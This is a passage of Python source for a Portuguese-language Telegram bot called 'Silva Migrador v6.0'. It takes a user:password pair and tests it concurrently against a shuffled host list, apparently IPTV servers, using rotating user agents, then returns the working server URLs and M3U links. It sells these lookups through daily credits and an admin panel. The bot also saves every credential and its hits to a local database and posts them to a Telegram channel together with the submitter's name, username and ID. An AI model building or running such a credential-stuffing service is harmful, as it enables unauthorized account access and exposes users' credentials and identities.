            f"🌐HOST: {r['server']}", f"🔎URL: {r['url_server']}", f"🔗M3U: {r['m3u_link']}",
            "▬▬▬ஜ۩𝑬𝒅𝒊𝒗𝒂𝒍𝒅𝒐۩ஜ▬▬▬", "",
        ]
    linhas += ["═"*46, f"Gerado: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", "Créditos: @Edkd1"]
    with open(filepath, "w", encoding="utf-8") as fh:
        fh.write("\n".join(linhas))
    return filepath

# ══════════════════════════════════════════════════════════════
# 15. VARREDURA EM TEMPO REAL (com threads configuráveis)
# ══════════════════════════════════════════════════════════════

async def varrer(username, password, max_results, bot, chat_id, loop, n_threads) -> tuple:
    hosts       = carregar_hosts(embaralhar=True)
    total_hosts = len(hosts)
    if not hosts:
        return [], None, None

    resultados    = []
    encontrados   = 0
    verificados   = 0
    parar         = threading.Event()
    res_lock      = threading.Lock()
    cnt_lock      = threading.Lock()
    hits_q: asyncio.Queue = asyncio.Queue()

    def checar(host):
        nonlocal encontrados, verificados
        if parar.is_set(): return
        try:
            r = testar_host(host, username, password)
        except Exception:
            r = None
        with cnt_lock:
            verificados += 1
        if r:
            with res_lock:
                if encontrados < max_results:
                    encontrados += 1
                    resultados.append(r)
                    asyncio.run_coroutine_threadsafe(hits_q.put(r), loop)
                    if encontrados >= max_results:
                        parar.set()

    msg_load = await bot.send_message(
        chat_id,
        msg_loading(username, 0, total_hosts, 0, max_results, n_threads),
        parse_mode="md",
    )

    msg_espera       = None
    primeiro_enviado = False
    concluida        = threading.Event()

    async def consumidor():
        nonlocal primeiro_enviado, msg_espera
        while True:
            try:
                hit = await asyncio.wait_for(hits_q.get(), timeout=1.0)
            except asyncio.TimeoutError:
                if parar.is_set() or concluida.is_set(): break
                continue
            if not primeiro_enviado:
                primeiro_enviado = True
                try: await msg_load.delete()
                except Exception: pass
                try:
                    await bot.send_message(chat_id, fmt_resultado(hit), parse_mode=None)
                except Exception as e:
                    log(f"Erro 1º resultado: {e}", "ERROR")
                try:
                    with cnt_lock: ver = verificados
                    with res_lock: enc = encontrados
                    msg_espera = await bot.send_message(
                        chat_id,
                        msg_pos_primeiro(username, enc, total_hosts, ver, max_results, n_threads),
                        parse_mode="md",
                    )
                except Exception as e:
                    log(f"Erro msg_espera: {e}", "ERROR")

    async def ui_loop():
        while not concluida.is_set():
            await asyncio.sleep(2.0)
            with res_lock: enc = encontrados
            with cnt_lock: ver = verificados
            if not primeiro_enviado:
                try:
                    await msg_load.edit(
                        msg_loading(username, enc, total_hosts, ver, max_results, n_threads),
                        parse_mode="md")
                except Exception: pass
            elif msg_espera:
                try:
                    await msg_espera.edit(
                        msg_pos_primeiro(username, enc, total_hosts, ver, max_results, n_threads),
                        parse_mode="md")
                except Exception: pass

    ui_task  = asyncio.create_task(ui_loop())
    con_task = asyncio.create_task(consumidor())

    await asyncio.get_running_loop().run_in_executor(
        None, lambda: _run_threads(hosts, checar, n_threads))

    concluida.set(); parar.set()

    try:
        await asyncio.wait_for(con_task, timeout=5.0)
    except (asyncio.TimeoutError, asyncio.CancelledError):
        con_task.cancel()

    ui_task.cancel()
    try: await ui_task
    except asyncio.CancelledError: pass

    return resultados, msg_load, msg_espera


def _run_threads(hosts, fn, n_threads):
    with ThreadPoolExecutor(max_workers=n_threads) as ex:
        for f in as_completed({ex.submit(fn, h): h for h in hosts}):
            try: f.result()
            except Exception: pass

# ══════════════════════════════════════════════════════════════
# 16. TECLADOS INLINE
# ══════════════════════════════════════════════════════════════

def teclado_principal():
    return [
        [Button.inline("🔍  Consultar Credencial", b"menu_consultar")],
        [Button.inline("🎟  Meus Créditos",        b"menu_creditos")],
        [Button.inline("ℹ️  Como Usar",            b"menu_ajuda")],
    ]

def teclado_admin():
    return [
        [Button.inline("🔍 Consultar",     b"menu_consultar"),
         Button.inline("🎟 Créditos",      b"menu_creditos")],
        [Button.inline("👥 Usuários",       b"adm_usuarios"),
         Button.inline("📊 Status",         b"adm_status")],
        [Button.inline("➕ Add Bônus",      b"adm_addbonus"),
         Button.inline("➖ Rm Bônus",       b"adm_rmbonus")],
        [Button.inline("🔗 Set URLs",       b"adm_seturls"),
         Button.inline("⚡ Set Velocidade", b"adm_setthreads")],
        [Button.inline("🚫 Bloquear",       b"adm_bloquear"),
         Button.inline("✅ Desbloquear",    b"adm_desbloquear")],
        [Button.inline("⏱ Punir (10min)",  b"adm_punir"),
         Button.inline("🔓 Revogar Punição",b"adm_revogar")],
        [Button.inline("⏳ Estender Punição",b"adm_estender"),
         Button.inline("🗑 Rm Créditos",   b"adm_rmcred")],
        [Button.inline("🔄 Reset Dia",      b"adm_resetdia"),
         Button.inline("📋 Banco DB",       b"adm_banco")],
    ]

def teclado_voltar():
    return [[Button.inline("🔙 Menu Principal", b"menu_voltar")]]

CRED_PATTERN       = re.compile(r"([^\s:]{2,64}):([^\s]{2,64})", re.MULTILINE)
CRED_UNICA_PATTERN = re.compile(r"^\s*([^\s:]{2,64}):([^\s]{2,64})\s*$", re.MULTILINE)

# ══════════════════════════════════════════════════════════════
# 17. SETUP CONSOLE
# ══════════════════════════════════════════════════════════════

def _load_config() -> dict:
    if not os.path.exists(CONFIG_FILE):
        return {}
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except Exception:
        return {}

def _save_config(cfg: dict):
    tmp = CONFIG_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as fh:
        json.dump(cfg, fh, indent=2)
    os.replace(tmp, CONFIG_FILE)

def setup_console() -> dict:
    cfg = _load_config()
    if cfg.get("api_id") and cfg.get("api_hash"):
        return cfg
    print()
    print("╔══════════════════════════════════════════════╗")
    print("║   🔐  SETUP INICIAL — SILVA MIGRADOR v6.0    ║")
    print("╚══════════════════════════════════════════════╝")
    print()
    print("  Acesse https://my.telegram.org → API development tools")
    print()
    while True:
        try:
            cfg["api_id"] = int(input("🔑 api_id  : ").strip()); break
        except ValueError:
            print("  ❌ Deve ser número inteiro.")
    while True:
        cfg["api_hash"] = input("🔑 api_hash: ").strip()
        if cfg["api_hash"]: break
        print("  ❌ Não pode ser vazio.")
    _save_config(cfg)
    print(f"\n  ✅ Salvo em {CONFIG_FILE}\n")
    return cfg

# ══════════════════════════════════════════════════════════════
# 18. MAIN
# ══════════════════════════════════════════════════════════════

async def main():
    cfg      = setup_console()
    API_ID   = cfg["api_id"]
    API_HASH = cfg["api_hash"]

    bot    = TelegramClient(SESSION_BOT, api_id=API_ID, api_hash=API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    bot_me = await bot.get_me()
    loop   = asyncio.get_running_loop()

    log(f"Bot iniciado: @{bot_me.username}", "SYSTEM")

    print()
    print("╔══════════════════════════════════════════════╗")
    print("║   ✅  SILVA MIGRADOR BOT v6.0  ONLINE         ║")
    print("╚══════════════════════════════════════════════╝")
    print(f"  🤖 Bot     : @{bot_me.username}")
    print(f"  👑 Owner   : {OWNER_ID}")
    print(f"  🎟 Diários : {DEFAULT_CREDITOS}/dia | ⭐ Bônus: permanentes")
    print(f"  🧵 Threads : {DEFAULT_THREADS} padrão / {MAX_THREADS_CAP} máx")
    print(f"  📡 Canal   : {CANAL_ID}")
    print(f"  💾 Banco   : {BANCO_FILE}")
    print(f"  🛡 Anti-abuso: bloqueio 10min por múltiplas creds")
    print(f"  🔵 User-agents: {len(USER_AGENTS)} disponíveis")
    print()
    print("  • Sem resultado → crédito NÃO consumido")
    print("  • 1º resultado  → enviado imediatamente")
    print("═" * 52)
    print()

    def is_owner(uid): return uid == OWNER_ID

    async def cache_user(uid: int):
        """Armazena nome e username do usuário no cache."""
        if uid in _user_cache:
            return
        try:
            entity = await bot.get_entity(uid)
            nome   = getattr(entity, "first_name", "") or ""
            sobr   = getattr(entity, "last_name",  "") or ""
            uname  = getattr(entity, "username",   None)
            _user_cache[uid] = {
                "nome":     (nome + " " + sobr).strip() or "Desconhecido",
                "username": uname,
            }
        except Exception:
            _user_cache[uid] = {"nome": "Desconhecido", "username": None}

    async def notificar_owner(texto: str):
        """Envia DM imediata ao owner."""
        try:
            await bot.send_message(OWNER_ID, texto, parse_mode="md")
        except Exception as e:
            log(f"Erro ao notificar owner: {e}", "ERROR")

    async def publicar_canal(uid: int, username: str, password: str, resultados: list):
        """Publica os resultados no canal com dados completos do usuário."""
        if not resultados:
            return
        await cache_user(uid)
        info   = _user_cache.get(uid, {})
        nome   = info.get("nome", "Desconhecido")
        uname  = info.get("username")
        uname_str = f"@{uname}" if uname else "sem @username"

        cabecalho = (
            f"🆕 **NOVA CONSULTA**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Nome: **{nome}**\n"
            f"🔗 Username: {uname_str}\n"
            f"🆔 ID: `{uid}`\n"
            f"🔑 Credencial: `{username}:{password}`\n"
            f"🏆 Resultados: `{len(resultados)}`\n"
            f"📅 {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━"
        )
        try:
            await bot.send_message(CANAL_ID, cabecalho, parse_mode="md")
        except Exception as e:
            log(f"Erro ao publicar cabeçalho no canal: {e}", "ERROR")
            return

        for i, r in enumerate(resultados, 1):
            try:
                await asyncio.sleep(0.3)
                await bot.send_message(CANAL_ID, fmt_resultado(r), parse_mode=None)
            except Exception as e:
                log(f"Erro ao publicar resultado {i} no canal: {e}", "ERROR")

    # ── Menu principal ────────────────────────────────────────

    async def enviar_menu(chat_id: int, uid: int, texto_extra: str = ""):
        cred    = cred_disponiveis(uid)
        await cache_user(uid)
        info    = _user_cache.get(uid, {})
        nome    = info.get("nome", "usuário")
        teclado = teclado_admin() if is_owner(uid) else teclado_principal()
        texto   = (
            f"╔══════════════════════════════════════╗\n"
            f"║   🤖  SILVA MIGRADOR BOT v6.0         ║\n"
            f"╚══════════════════════════════════════╝\n\n"
            f"Olá, **{nome}**! 👋\n\n"
            f"🎟 Diários: `{cred['diarios_rest']}/{DEFAULT_CREDITOS}`\n"
            f"⭐ Bônus: `{cred['bonus']}`\n"
            f"🔋 Total disponível: `{cred['total']}`\n"
        )
        if texto_extra:
            texto += f"\n{texto_extra}\n"
        texto += "\nEscolha uma opção:"
        await bot.send_message(chat_id, texto, buttons=teclado, parse_mode="md")

    # ══════════════════════════════════════════════════════════
    # /start
    # ══════════════════════════════════════════════════════════

    @bot.on(events.NewMessage(pattern=r"^/start$"))
    async def cmd_start(event):
        uid = event.sender_id
        await cache_user(uid)
        _estados.pop(uid, None)
        cred    = cred_disponiveis(uid)
        info    = _user_cache.get(uid, {})
        nome    = info.get("nome", "usuario")
        teclado = teclado_admin() if is_owner(uid) else teclado_principal()
        await event.respond(
            "╔══════════════════════════════════════╗\n"
            "║   🤖  SILVA MIGRADOR BOT v6.0         ║\n"
            "╚══════════════════════════════════════╝\n\n"
            f"Olá, **{nome}**! 👋\n\n"
            f"🎟 Diários: `{cred['diarios_rest']}/{DEFAULT_CREDITOS}`\n"
            f"⭐ Bônus: `{cred['bonus']}`\n"
            f"🔋 Total disponível: `{cred['total']}`\n\n"
            "Escolha uma opção:",
            buttons=teclado, parse_mode="md"
        )

    @bot.on(events.CallbackQuery())
    async def callback_handler(event):
        uid  = event.sender_id
        data = event.data.decode()

        await cache_user(uid)

        # Verificações de acesso
        if is_bloqueado_perm(uid) and not is_owner(uid):
            await event.answer("🚫 Você está bloqueado permanentemente.", alert=True)
            return

        punido, restante = esta_punido(uid)
        if punido and not is_owner(uid):
            await event.answer(
                f"⏳ Você está em punição. Aguarde {restante//60}min {restante%60}s.",
                alert=True)
            return

        # ── Voltar ao menu ────────────────────────────────────
        if data == "menu_voltar":
            await event.answer()
            _estados.pop(uid, None)
            cred    = cred_disponiveis(uid)
            info    = _user_cache.get(uid, {})
            nome    = info.get("nome", "usuário")
            teclado = teclado_admin() if is_owner(uid) else teclado_principal()
            await event.edit(
                f"╔══════════════════════════════════════╗\n"
                f"║   🤖  SILVA MIGRADOR BOT v6.0         ║\n"
                f"╚══════════════════════════════════════╝\n\n"
                f"Olá, **{nome}**! 👋\n\n"
                f"🎟 Diários: `{cred['diarios_rest']}/{DEFAULT_CREDITOS}`\n"
                f"⭐ Bônus: `{cred['bonus']}`\n"
                f"🔋 Total: `{cred['total']}`\n\n"
                f"Escolha uma opção:",
                buttons=teclado, parse_mode="md")
            return

        # ── Consultar ────────────────────────────────────────
        if data == "menu_consultar":
            await event.answer()
            cred = cred_disponiveis(uid)
            if cred["total"] <= 0:
                await event.answer(
                    f"🚫 Sem créditos! Diários: 0/{DEFAULT_CREDITOS} | Bônus: 0",
                    alert=True)
                return
            u = get_info(uid)
            _estados[uid] = {"estado": "aguardando_cred"}
            await event.edit(
                f"🔍 **CONSULTA DE CREDENCIAL**\n\n"
                f"Digite a credencial no formato:\n"
                f"`usuario:senha`\n\n"
                f"🎟 Disponível: `{cred['total']}` créditos\n"
                f"⚡ Velocidade: `{u.get('threads', DEFAULT_THREADS)}` threads\n"
                f"🔗 URLs por resultado: `{u.get('max_urls', DEFAULT_MAX_URLS)}`\n\n"
                f"_⚠️ Enviar múltiplas credenciais resulta em punição de 10min._\n\n"
                f"_/cancelar para voltar._",
                buttons=[[Button.inline("❌ Cancelar", b"menu_voltar")]],
                parse_mode="md")
            return

        # ── Meus Créditos ─────────────────────────────────────
        if data == "menu_creditos":
            await event.answer()
            cred = cred_disponiveis(uid)
            u    = get_info(uid)
            await event.edit(
                f"🎟 **Seus Créditos**\n\n"
                f"📅 Diários hoje: `{cred['diarios_rest']}/{DEFAULT_CREDITOS}`\n"
                f"⭐ Bônus permanentes: `{cred['bonus']}` _(não expiram)_\n"
                f"🔋 Total disponível: `{cred['total']}`\n"
                f"🔗 URLs/consulta: `{u.get('max_urls', DEFAULT_MAX_URLS)}`\n"
                f"⚡ Velocidade: `{u.get('threads', DEFAULT_THREADS)}` threads\n\n"
                f"🔄 Créditos diários renovam à **meia-noite**\n"
                f"_(não acumulam — sempre {DEFAULT_CREDITOS}/dia)_",
                buttons=teclado_voltar(), parse_mode="md")
            return

        # ── Ajuda ─────────────────────────────────────────────
        if data == "menu_ajuda":
            await event.answer()
            await event.edit(
                f"ℹ️ **Como Usar**\n\n"
                f"1️⃣ Clique em 🔍 **Consultar Credencial**\n"
                f"2️⃣ Digite: `usuario:senha`\n"
                f"3️⃣ O 1º resultado aparece imediatamente!\n\n"
                f"**📋 Créditos:**\n"
                f"• `{DEFAULT_CREDITOS}` consultas/dia (renova meia-noite)\n"
                f"• Sem acúmulo — sempre começa com {DEFAULT_CREDITOS}\n"
                f"• Bônus do owner nunca expiram\n"
                f"• Sem resultado = **sem consumo de crédito**\n\n"
                f"**⚠️ Anti-abuso:**\n"
                f"• Enviar múltiplas credenciais = **punição 10min**\n"
                f"• Tentativas de abuso são reportadas ao admin\n\n"
                f"**👑 Owner:** @Edkd1",
                buttons=teclado_voltar(), parse_mode="md")
            return

        # ══════════════════════════════════════════════════════
        # CALLBACKS EXCLUSIVOS DO OWNER
        # ══════════════════════════════════════════════════════

        if not is_owner(uid):
            await event.answer("⛔ Sem permissão.", alert=True)
            return

        # ── Usuários ──────────────────────────────────────────
        if data == "adm_usuarios":
            await event.answer()
            dados = admin_listar()
            if not dados:
                await event.edit("📋 Nenhum usuário ainda.", buttons=teclado_voltar())
                return
            today  = TODAY()
            linhas = [f"👥 **Usuários ({len(dados)}):**\n"]
            for uid_s, u in sorted(dados.items()):
                if u.get("data_reset") != today: u["diarios_usados"] = 0
                dr    = max(0, DEFAULT_CREDITOS - u["diarios_usados"])
                bn    = u.get("bonus", 0)
                urls  = u.get("max_urls", DEFAULT_MAX_URLS)
                thr   = u.get("threads", DEFAULT_THREADS)
                blq   = "🚫" if u.get("bloqueado") else ""
                punido_flag, _ = esta_punido(int(uid_s))
                pun_flag = "⏳" if punido_flag else ""
                # Tenta mostrar nome do cache
                info_c = _user_cache.get(int(uid_s), {})
                nome_c = info_c.get("nome", "")
                uname_c = info_c.get("username")
                id_str = f"`{uid_s}`"
                if nome_c:
                    ustr = f"@{uname_c}" if uname_c else "sem @"
                    id_str = f"**{nome_c}** ({ustr}) `{uid_s}`"
                linhas.append(
                    f"{blq}{pun_flag} {id_str}\n"
                    f"  🎟 `{dr}/{DEFAULT_CREDITOS}` | ⭐ `{bn}` | 🔗 `{urls}` | ⚡ `{thr}`"
                )
            await event.edit("\n".join(linhas), buttons=teclado_voltar(), parse_mode="md")
            return

        # ── Status ────────────────────────────────────────────
        if data == "adm_status":
            await event.answer()
            n_hosts = len(carregar_hosts(embaralhar=False))
            n_usu   = len(admin_listar())
            try:
                with open(BANCO_FILE, "r") as bf:
                    n_banco = sum(1 for l in bf if l.strip())
            except Exception:
                n_banco = 0
            await event.edit(
                f"╔══════════════════════════════════════╗\n"
                f"║   📊 STATUS — SILVA MIGRADOR v6.0     ║\n"
                f"╚══════════════════════════════════════╝\n\n"
                f"✅ Online — @{bot_me.username}\n\n"
                f"📋 Hosts: `{n_hosts}`\n"
                f"💾 Banco db.txt: `{n_banco}` entradas\n"
                f"🎟 Créditos/dia: `{DEFAULT_CREDITOS}`\n"
                f"🔗 URLs padrão: `{DEFAULT_MAX_URLS}`\n"
                f"⚡ Threads padrão: `{DEFAULT_THREADS}` (máx {MAX_THREADS_CAP})\n"
                f"👥 Usuários: `{n_usu}`\n"
                f"🔄 Consultas ativas: `{len(_em_andamento)}`\n"
                f"🛡 Punições ativas: `{len(_punicoes)}`\n"
                f"👁 UAs disponíveis: `{len(USER_AGENTS)}`\n"
                f"🕐 `{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}`",
                buttons=teclado_voltar(), parse_mode="md")
            return

        # ── Banco DB ──────────────────────────────────────────
        if data == "adm_banco":
            await event.answer()
            try:
                with open(BANCO_FILE, "r", encoding="utf-8") as bf:
                    linhas_banco = [l.strip() for l in bf if l.strip()]
                n = len(linhas_banco)
                if n == 0:
                    await event.edit("💾 Banco vazio.", buttons=teclado_voltar())
                    return
                # Mostra últimas 20 entradas
                preview = "\n".join(linhas_banco[-20:])
                await event.edit(
                    f"💾 **Banco de Dados** ({n} entradas)\n\n"
                    f"_Últimas 20:_\n```\n{preview}\n```",
                    buttons=[
                        [Button.inline("📥 Baixar banco completo", b"adm_banco_dl")],
                        *teclado_voltar()
                    ],
                    parse_mode="md")
            except Exception as e:
                await event.edit(f"❌ Erro: {e}", buttons=teclado_voltar())
            return

        if data == "adm_banco_dl":
            await event.answer()
            try:
                await bot.send_file(
                    OWNER_ID, BANCO_FILE,
                    caption=f"💾 Banco completo — {datetime.now().strftime('%d/%m/%Y %H:%M')}")
            except Exception as e:
                await bot.send_message(OWNER_ID, f"❌ Erro ao enviar banco: {e}")
            return

        # ── Ações que aguardam texto ──────────────────────────
        acoes_texto = {
            "adm_addbonus":    ("adm_addbonus",    "➕ **Add Bônus**\n\n`<user_id> <n>`\nEx: `123456 10`"),
            "adm_rmbonus":     ("adm_rmbonus",     "➖ **Rm Bônus**\n\n`<user_id> <n>`\nEx: `123456 5`"),
            "adm_seturls":     ("adm_seturls",     "🔗 **Set URLs/consulta**\n\n`<user_id> <n>` (1-50)\nEx: `123456 3`"),
            "adm_setthreads":  ("adm_setthreads",  f"⚡ **Set Velocidade (Threads)**\n\n`<user_id> <n>` (1-{MAX_THREADS_CAP})\nEx: `123456 80`\n\n_Padrão: {DEFAULT_THREADS}_"),
            "adm_bloquear":    ("adm_bloquear",    "🚫 **Bloquear Usuário (permanente)**\n\nDigite o ID:\n`<user_id>`"),
            "adm_desbloquear": ("adm_desbloquear", "✅ **Desbloquear Usuário**\n\nDigite o ID:\n`<user_id>`"),
            "adm_punir":       ("adm_punir",       "⏱ **Punir Usuário (10min)**\n\nDigite o ID:\n`<user_id>`\n\n_Ou `<user_id> <segundos>` para tempo customizado._"),
            "adm_revogar":     ("adm_revogar",     "🔓 **Revogar Punição**\n\nDigite o ID:\n`<user_id>`"),
            "adm_estender":    ("adm_estender",    "⏳ **Estender Punição**\n\n`<user_id> <segundos>`\nEx: `123456 300` (+ 5min)"),
            "adm_rmcred":      ("adm_rmcred",      "🗑 **Remover Créditos Diários**\n\n`<user_id> <n>`\nEx: `123456 2`"),
            "adm_resetdia":    ("adm_resetdia",    "🔄 **Reset Créditos Diários**\n\nDigite o ID:\n`<user_id>`"),
        }
        if data in acoes_texto:
            await event.answer()
            estado, instrucao = acoes_texto[data]
            _estados[uid] = {"estado": estado}
            await event.edit(
                instrucao + "\n\n_/cancelar para voltar._",
                buttons=[[Button.inline("❌ Cancelar", b"menu_voltar")]],
                parse_mode="md")
            return

    # ══════════════════════════════════════════════════════════
    # HANDLER DE MENSAGENS DE TEXTO
    # ══════════════════════════════════════════════════════════

    @bot.on(events.NewMessage(func=lambda e: e.is_private and not e.via_bot_id))
    async def handler_texto(event):
        uid   = event.sender_id
        texto = (event.raw_text or "").strip()

        # Ignora comandos tratados por handlers dedicados
        if texto.lower() in ("/start",):
            return

        await cache_user(uid)

        # /cancelar
        if texto.lower() == "/cancelar":
            _estados.pop(uid, None)
            cred    = cred_disponiveis(uid)
            teclado = teclado_admin() if is_owner(uid) else teclado_principal()
            await event.respond(
                f"✅ Cancelado.\n🎟 Diários: `{cred['diarios_rest']}/{DEFAULT_CREDITOS}` | ⭐ `{cred['bonus']}`",
                buttons=teclado, parse_mode="md")
            return

        estado = _estados.get(uid, {}).get("estado")

        # ── Consulta de credencial ────────────────────────────
        if estado == "aguardando_cred":

            # ── ANTI-ABUSO: detecta múltiplas credenciais ─────
            todas_creds = CRED_PATTERN.findall(texto)
            if len(todas_creds) > 1:
                _estados.pop(uid, None)
                expira = punir_usuario(uid, PUNISH_DURATION)
                exp_str = expira.strftime("%H:%M:%S")

                info   = _user_cache.get(uid, {})
                nome   = info.get("nome", "Desconhecido")
                uname  = info.get("username")
                uname_str = f"@{uname}" if uname else "sem @"

                # Silêncio total — sem resposta ao usuário
                # DM imediata ao owner
                await notificar_owner(
                    f"🚨 **TENTATIVA DE ABUSO DETECTADA**\n\n"
                    f"👤 Nome: **{nome}**\n"
                    f"🔗 Username: {uname_str}\n"
                    f"🆔 ID: `{uid}`\n\n"
                    f"📨 Mensagem enviada:\n`{texto[:300]}`\n\n"
                    f"⏱ Punição aplicada: `10 minutos`\n"
                    f"🕐 Expira às: `{exp_str}`\n\n"
                    f"**Ações disponíveis:**\n"
                    f"`/revogar {uid}` — revogar punição\n"
                    f"`/estender {uid} <seg>` — estender\n"
                    f"`/bloquear {uid}` — bloquear permanente\n"
                    f"`/rmbonus {uid} <n>` — remover bônus\n"
                    f"`/rmcred {uid} <n>` — remover créditos"
                )
                log(f"ABUSO: uid={uid} nome={nome} tentou {len(todas_creds)} creds", "ABUSO")
                # Sem resposta ao usuário — silêncio total
                return

            # ── Credencial única ──────────────────────────────
            match = CRED_UNICA_PATTERN.match(texto)
            if not match:
                await event.respond(
                    "❌ Formato inválido.\n\nUse: `usuario:senha`\n\nTente novamente ou /cancelar",
                    parse_mode="md")
                return

            username = match.group(1).strip()
            password = match.group(2).strip()

            # Verificações
            if is_bloqueado_perm(uid) and not is_owner(uid):
                return
            punido, restante = esta_punido(uid)
            if punido and not is_owner(uid):
                return  # silêncio

            # Cooldown
            now     = time.monotonic()
            elapsed = now - _last_query.get(uid, 0.0)
            if elapsed < COOLDOWN and not is_owner(uid):
                await event.respond(
                    f"⏳ Aguarde `{math.ceil(COOLDOWN - elapsed)}s`.",
                    parse_mode="md")
                return
            _last_query[uid] = now

            # Créditos
            cred = cred_disponiveis(uid)
            if cred["total"] <= 0:
                _estados.pop(uid, None)
                await event.respond(
                    f"🚫 **Sem créditos!**\n\n"
                    f"🎟 Diários: `0/{DEFAULT_CREDITOS}` _(renova meia-noite)_\n"
                    f"⭐ Bônus: `0`",
                    buttons=teclado_voltar(), parse_mode="md")
                return

            # Em andamento
            if uid in _em_andamento:
                await event.respond("⏳ Consulta em andamento. Aguarde.", parse_mode="md")
                return

            _estados.pop(uid, None)
            _em_andamento.add(uid)
            max_urls    = get_max_urls(uid)
            n_threads   = get_threads(uid)
            total_hosts = len(carregar_hosts(embaralhar=False))

            log(f"Consulta uid={uid} user={username} threads={n_threads} urls={max_urls}", "CONSULTA")

            try:
                resultados, msg_load, msg_espera = await varrer(
                    username, password, max_urls,
                    bot, event.chat_id, loop, n_threads)
            except Exception:
                log(f"varrer exception: {traceback.format_exc()}", "ERROR")
                resultados, msg_load, msg_espera = [], None, None
            finally:
                _em_andamento.discard(uid)

            cred_atual = cred_disponiveis(uid)
            teclado    = teclado_admin() if is_owner(uid) else teclado_principal()

            # Sem resultado
            if not resultados:
                try:
                    if msg_load:
                        await msg_load.edit(
                            msg_sem_resultado(username, total_hosts, cred_atual),
                            parse_mode="md")
                except Exception: pass
                await bot.send_message(event.chat_id, "🔙 Menu:", buttons=teclado)
                log(f"Sem resultado uid={uid} — crédito NÃO consumido", "INFO")
                return

            # Com resultado
            consumir_credito(uid)
            cred_pos = cred_disponiveis(uid)

            # URLs extras
            if len(resultados) > 1:
                try:
                    await asyncio.sleep(0.3)
                    await bot.send_message(event.chat_id, fmt_extras(resultados[1:]), parse_mode=None)
                except Exception as e:
                    log(f"Erro URLs extras: {e}", "ERROR")

            # Edita msg de espera
            if msg_espera:
                try:
                    await msg_espera.edit(
                        msg_concluido(username, len(resultados), cred_pos),
                        parse_mode="md")
                except Exception: pass
            elif msg_load:
                try: await msg_load.delete()
                except Exception: pass

            # Salva e envia arquivo
            try:
                fp = salvar_arquivo(username, password, resultados, uid)
                await bot.send_file(
                    event.chat_id, fp,
                    caption=(
                        f"📄 Resultado completo\n"
                        f"👤 `{username}` | {len(resultados)} hit(s)\n"
                        f"🎟 Diários: `{cred_pos['diarios_rest']}/{DEFAULT_CREDITOS}`\n"
                        f"⭐ Bônus: `{cred_pos['bonus']}`\n"
                        f"📅 {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
                        f"▬▬▬ஜ۩𝑬𝒅𝒊𝒗𝒂𝒍𝒅𝒐۩ஜ▬▬▬"
                    ))
            except Exception as e:
                log(f"Erro ao enviar arquivo: {e}", "ERROR")

            # Salva no banco sem duplicatas
            novas = salvar_no_banco(username, password, resultados)
            log(f"Banco: +{novas} novas entradas", "BANCO")

            # Publica no canal
            await publicar_canal(uid, username, password, resultados)

            # Menu
            await bot.send_message(event.chat_id, "🔙 Menu:", buttons=teclado)
            log(f"Entregue {len(resultados)} hit(s) uid={uid}", "INFO")
            return

        # ══════════════════════════════════════════════════════
        # ESTADOS ADMIN (texto)
        # ══════════════════════════════════════════════════════

        if not is_owner(uid):
            if not estado:
                cred    = cred_disponiveis(uid)
                teclado = teclado_principal()
                await event.respond(
                    f"🤖 Use os botões abaixo.\n\n"
                    f"🎟 `{cred['diarios_rest']}/{DEFAULT_CREDITOS}` | ⭐ `{cred['bonus']}`",
                    buttons=teclado, parse_mode="md")
            return

        teclado_adm = teclado_admin()

        def _parse_id_n(t, require_n=True):
            parts = t.split()
            if require_n:
                if len(parts) != 2 or not all(p.lstrip("-").isdigit() for p in parts):
                    return None, None
                return int(parts[0]), int(parts[1])
            else:
                if len(parts) < 1 or not parts[0].lstrip("-").isdigit():
                    return None, None
                return int(parts[0]), int(parts[1]) if len(parts) > 1 else None

        async def _reply_adm(msg):
            await event.respond(msg, buttons=teclado_adm, parse_mode="md")

        if estado == "adm_addbonus":
            _estados.pop(uid, None)
            tid, n = _parse_id_n(texto)
            if tid is None: await _reply_adm("❌ Formato: `<id> <n>`"); return
            u = admin_add_bonus(tid, n)
            await _reply_adm(f"✅ Bônus +{n} para `{tid}` → total `{u['bonus']}`")

        elif estado == "adm_rmbonus":
            _estados.pop(uid, None)
            tid, n = _parse_id_n(texto)
            if tid is None: await _reply_adm("❌ Formato: `<id> <n>`"); return
            u = admin_rm_bonus(tid, n)
            await _reply_adm(f"✅ Bônus -{n} de `{tid}` → restante `{u['bonus']}`")

        elif estado == "adm_seturls":
            _estados.pop(uid, None)
            tid, n = _parse_id_n(texto)
            if tid is None or not 1 <= n <= 50: await _reply_adm("❌ `<id> <n>` (1-50)"); return
            u = admin_set_urls(tid, n)
            await _reply_adm(f"✅ URLs de `{tid}` → `{u['max_urls']}`/consulta")

        elif estado == "adm_setthreads":
            _estados.pop(uid, None)
            tid, n = _parse_id_n(texto)
            if tid is None or not 1 <= n <= MAX_THREADS_CAP:
                await _reply_adm(f"❌ `<id> <n>` (1-{MAX_THREADS_CAP})"); return
            u = admin_set_threads(tid, n)
            await _reply_adm(f"✅ Velocidade de `{tid}` → `{u['threads']}` threads")

        elif estado == "adm_bloquear":
            _estados.pop(uid, None)
            tid, _ = _parse_id_n(texto, require_n=False)
            if tid is None: await _reply_adm("❌ Digite o ID."); return
            admin_bloquear(tid)
            await _reply_adm(f"🚫 `{tid}` bloqueado permanentemente.")
            await notificar_owner(f"🚫 Usuário `{tid}` bloqueado pelo admin.")

        elif estado == "adm_desbloquear":
            _estados.pop(uid, None)
            tid, _ = _parse_id_n(texto, require_n=False)
            if tid is None: await _reply_adm("❌ Digite o ID."); return
            admin_desbloquear(tid)
            await _reply_adm(f"✅ `{tid}` desbloqueado.")

        elif estado == "adm_punir":
            _estados.pop(uid, None)
            tid, dur = _parse_id_n(texto, require_n=False)
            if tid is None: await _reply_adm("❌ `<id>` ou `<id> <segundos>`"); return
            duracao = dur if dur and dur > 0 else PUNISH_DURATION
            expira  = punir_usuario(tid, duracao)
            exp_str = expira.strftime("%H:%M:%S")
            await _reply_adm(f"⏱ `{tid}` punido por `{duracao}s` — expira `{exp_str}`")

        elif estado == "adm_revogar":
            _estados.pop(uid, None)
            tid, _ = _parse_id_n(texto, require_n=False)
